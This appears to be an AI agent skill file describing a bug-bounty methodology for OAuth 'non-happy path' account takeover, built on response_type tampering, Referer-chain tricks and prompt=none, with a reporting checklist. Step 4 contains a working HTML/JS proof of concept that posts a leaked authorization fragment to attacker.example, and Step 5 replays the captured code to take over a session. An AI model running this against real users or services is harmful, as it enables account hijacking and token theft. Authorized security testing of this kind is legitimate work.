---
name: oauth-non-happy-path-ato
description: >
  Use this skill during authorized bug bounty / pentest recon whenever a target has "Login with Google/Facebook/GitHub/etc." (OAuth/OIDC social login). Covers hunting for the "non-happy path": forcing the client app's OAuth callback off its expected success branch (e.g. by tampering response_type, omitting expected params, or triggering an error branch) so it falls back to a Referer-based or otherwise attacker-influenceable redirect, then chaining that with response_type confusion (code, id_token, or comma-separated multi-value response_type like "code,id_token"), window.opener Referer-chain tricks, and prompt=none to leak a live authorization code or token to an attacker-controlled origin for full account takeover. Trigger on requests to test OAuth/SSO login flows, look for OAuth account takeover (ATO), audit an OAuth redirect_uri/callback handler, or "check the non-happy path" / "dirty dancing" style OAuth bugs — always only against in-scope, authorized targets, and only using your own test accounts.
metadata:
  source: https://blog.voorivex.team/oauth-non-happy-path-to-ato
  related_source: https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/
---

# OAuth "Non-Happy Path" Account Takeover

Methodology from Omid Rezaei / Voorivex Team, building on Frans Rosén's "Dirty Dancing" OAuth research. The core idea: an OAuth client app's callback handler almost always has an unhappy branch (missing/malformed param, unexpected `response_type`, error case) that developers under-test. Forcing execution down that branch, combined with browser Referer behavior, can leak a live authorization code or token to an attacker-controlled page.

Only test this against in-scope targets using accounts you control (your own or throwaway test accounts) — never against real victims. This class of bug directly yields account takeover, so treat any working PoC as a critical finding and stop at proof of concept.

## Step 1: Map the happy path vs. the non-happy path

Walk the normal "Login with X" flow once and note the full happy path: which params the app sends to the provider (`client_id`, `redirect_uri`, `response_type`, `scope`, `state`, ...), and exactly how the callback handler processes the provider's response (reads `code` from query string, exchanges it server-side, sets a session).

Then look for the **fallback/error branch** in the callback handler: what does the app do when an *expected* parameter is missing, malformed, or when the provider redirects back without one it expects? Many apps handle this by redirecting the browser somewhere — and some derive that "somewhere" from the `Referer` header of the callback request itself, rather than a fixed URL. That Referer-based redirect-on-error is the non-happy path you're hunting for.

**How to force the non-happy path:** the most reliable lever is the `response_type` parameter sent to the *authorization* endpoint:
- Switch `response_type=code` → `response_type=id_token` (or `token`) to see if the client's callback code, which expects a `code` query param, chokes and falls into the fallback/error branch instead.
- Some providers (Google) accept **comma-separated multiple values**, e.g. `response_type=code,id_token` (or `id_token,code`) — this can make the provider return *both* an authorization code and an id_token together in the URL **fragment**, not the query string, which most server-side callback handlers never read — pushing the flow into the fallback branch while still handing you a live `code`.
- Note which providers don't give you this lever at all: e.g. GitHub's OAuth flow has no `response_type` to manipulate; Facebook typically requires an explicit user confirmation click that resets the Referer chain (see Step 3) and is usually non-exploitable this way.

## Step 2: Confirm conditions for exploitability

Before building a PoC, verify all of these against your target:

1. **You cannot control the redirect via parameters alone** — i.e. the app doesn't just accept a `redirect_uri`/`next`/`return_to` param you can freely set (that would be a plain open redirect, simpler bug, test for it separately).
2. **The fallback/error branch actually performs a redirect based on `Referer`** rather than a fixed internal URL.
3. **You can make the final leg of the redirect chain see an attacker-controlled `Referer`.**
4. **The leaked value is (or can be turned into) a usable authorization `code`**, not just an `id_token` — many client apps only implement the code-exchange path server-side and have no code path that accepts a bare `id_token`, so an `id_token`-only leak is often a dead end for full ATO (though still worth flagging).

## Step 3: Engineer the Referer chain

Key browser behavior to exploit: when page `attacker.com` does `window.open('https://provider.com/oauth/authorize?...')`, and the provider issues a chain of `3xx` redirects (`provider.com` → `client.com/callback` → non-happy-path redirect target), the **`Referer` seen at the end of the chain is still `attacker.com`** — the original opener — not any intermediate hop. This holds across arbitrarily long redirect chains (w → x → y → z still shows `w` as Referer to `z`), as long as every hop is a server-side (3xx) redirect, not a client-side one that a browser navigation resets.

Watch for anything that breaks this chain and resets the Referer, which kills exploitability:
- A **confirmation click** the provider inserts before authorizing (common on Facebook) — resets Referer to the provider's own domain.
- An **account picker** prompt when the browser has multiple sessions with the provider (common on Google) — same effect. **Workaround:** add `prompt=none` to the authorization request for a victim who has an existing session with that provider and only one account (or has already granted consent) — this suppresses the picker/consent screen and keeps the flow silent and Referer-chain-intact.
- Also distinguish **server-side vs. client-side redirects** generally: a server-side (3xx) redirect preserves the URL fragment (`#...`) across the hop; a client-side redirect (JS `location.href = ...`) strips it. If the leaked secret ends up in a fragment, you need every hop after the leak to be server-side or read via `window.location.hash` before any client-side navigation clears it.

## Step 4: Build and run the PoC

Minimal attacker page pattern — open the manipulated authorization URL in a popup, then read `window.location.hash` once the popup lands on `attacker.com` (the non-happy-path destination) and exfiltrate it:

```html
<script>
function exploit() {
  window.open(
    "https://accounts.google.com/o/oauth2/auth?client_id=<client_id>" +
    "&redirect_uri=<target's real redirect_uri>" +
    "&scope=<same scopes the app normally requests>" +
    "&state=&response_type=id_token,code&prompt=none",
    "", "width=10,height=10"
  );
}
window.addEventListener('load', () => {
  const fragment = window.location.hash;
  if (fragment) {
    fetch('https://attacker.example/save_tokens', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: encodeURIComponent(fragment)
    });
  }
});
</script>
<button onclick="exploit()">exploit</button>
```

This only works when hosted at (or the popup's opener is) the attacker-controlled origin whose Referer needs to leak through — for your own authorized testing, host it on a domain/path you control and drive it with your own test account first to confirm the chain end-to-end before treating it as a finding.

Adapt per-provider:
- **Google:** the `response_type=code,id_token` comma trick plus `prompt=none` is the strongest combination — confirm the provider being tested still accepts multi-value `response_type` and still honors `prompt=none` the same way, since IdPs change this behavior over time.
- **Facebook:** check whether the forced-confirmation step can be avoided (e.g. already-authorized app, different flow variant); if not, this vector is likely dead for Facebook on this target.
- **GitHub / other providers without a `response_type` lever:** look for a different way to force the non-happy branch — a malformed `scope`, a `state` mismatch, an unsupported `redirect_uri` variant, or any other param the callback handler doesn't defensively check.

## Step 5: Turn the leak into account takeover

Confirm you actually captured a `code` (not just an `id_token`) in the exfiltrated fragment, then replay it against the client app's real token-exchange endpoint (using your own second test browser/session that isn't logged in) to confirm session takeover. Stop here — don't pivot into the victim's other data once takeover is confirmed; that's enough for the report.

## Reporting checklist

- Full request/response chain showing: initial `window.open` URL with tampered `response_type`/`prompt`, each 3xx hop, and the final request to the non-happy-path destination showing the attacker Referer and the leaked fragment.
- Which provider(s) were exploitable and which weren't, and why (confirmation click, account picker, no `response_type` lever, etc.) — this context helps triage and is often asked for.
- Proof the leaked value was a `code` usable for real session takeover, not just an `id_token`.
- Expect pushback on severity: programs often downgrade CVSS attack-complexity from LOW to HIGH here since it depends on the victim having a live IdP session (so `prompt=none` succeeds) — have your complexity justification ready.
